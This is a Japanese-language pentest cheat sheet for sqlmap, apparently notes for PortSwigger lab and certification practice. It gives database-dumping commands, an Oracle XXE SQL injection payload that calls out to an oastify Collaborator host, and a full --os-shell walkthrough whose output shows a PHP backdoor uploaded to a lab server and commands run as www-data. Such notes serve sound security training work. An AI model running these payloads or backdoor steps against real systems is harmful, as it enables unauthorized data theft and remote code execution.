##### 🚨SQLmapで唯一解決できないケース

- CheckStock機能のPOSTリクスト
- [LAB:SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
- [github](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file#labs-1)を参考に

---
## SQLMap

- データベースのdump。興味深いデータベースを探す(`public`等)
```zsh
sqlmap -u "[URL]" --batch --dbms [DBMS] --technique [Type] --dbs
```

- テーブルのdump
```zsh
sqlmap -u "[URL]" --batch --dbms [DBMS] --technique [Type] -D [dbs] --tables
```

- ⭐️テーブルのカラムとその値のdump
```zsh
sqlmap -u "[URL]" --technique [Type] --dbms [DBMS] --batch -D [dbs] -T [tableName] --dump
```

- カラムのdump
```zsh
sqlmap -u "[URL]" --technique [Type] --dbms [DBMS] --batch --columns -D [DB name] -T [TableName]
```
⚠️
　もしうまくdumpできないときは、levelやriskをあげる。カラム名がわかっているなら、`-C [columname]`とする

#### OAST

- Tracking ID CookieをScanすると以下のように表示される。CollaboratorでDNS lookupを行う
```
TRACKING_ID'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % iukdo SYSTEM "http://6pwtq4b9illwpkwc3nd4lh37wy2pqfe4.oasti'||'fy.com/">%iukdo;]>'),'/l') from dual)||'
```

---

### full interactive shellを獲得（--os-shell）

1. リクエストをBurpでキャプチャし、ローカルにテキストファイルとして保存する
```post.txt
POST /search.php HTTP/1.1
Host: 192.168.50.19
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.50.19
Connection: close
Referer: http://192.168.50.19/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1

item=test
```

2. SQLiに脆弱なパラメタを`-p`で指定し、書き込み可能なフォルダに`--os-shell`を指定する
```zsh
kali@kali:~$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
...
[*] starting @ 02:20:47 PM /2022-05-19/

[14:20:47] [INFO] parsing HTTP request from 'post'
[14:20:47] [INFO] resuming back-end DBMS 'mysql'
[14:20:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
...
---
[14:20:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.6
[14:20:48] [INFO] going to use a web backdoor for command prompt
[14:20:48] [INFO] fingerprinting the back-end DBMS operating system
[14:20:48] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
[14:20:49] [INFO] retrieved web server absolute paths: '/var/www/html/search.php'
[14:20:49] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via LIMIT 'LINES TERMINATED BY' method
[14:20:50] [WARNING] unable to upload the file stager on '/var/www/html/tmp/'
[14:20:50] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via UNION method
[14:20:50] [WARNING] expect junk characters inside the file as a leftover from UNION query
[14:20:50] [INFO] the remote file '/var/www/html/tmp/tmpuqgek.php' is larger (713 B) than the local file '/tmp/sqlmapxkydllxb82218/tmp3d64iosz' (709B)
[14:20:51] [INFO] the file stager has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpuqgek.php
[14:20:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpbetmz.php
[14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: '/var/www/html/tmp'
```

---
### SQLMap基本

- `--technique`で指定できるリスト(組合せ可)
	- `B`: Boolean-based blind
	- `E`: Error-based
	- `U`: Union query-based
	- `S`: Stacked queries
	- `T`: Time-based blind
	- `Q`: Inline queries

- 使い方は[HackTricks: SQL map](https://book.hacktricks.xyz/v/jp/pentesting-web/sql-injection/sqlmap)を参照。公式より具体例が多くわかりやすい
- しかし公式が信頼度高い[SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)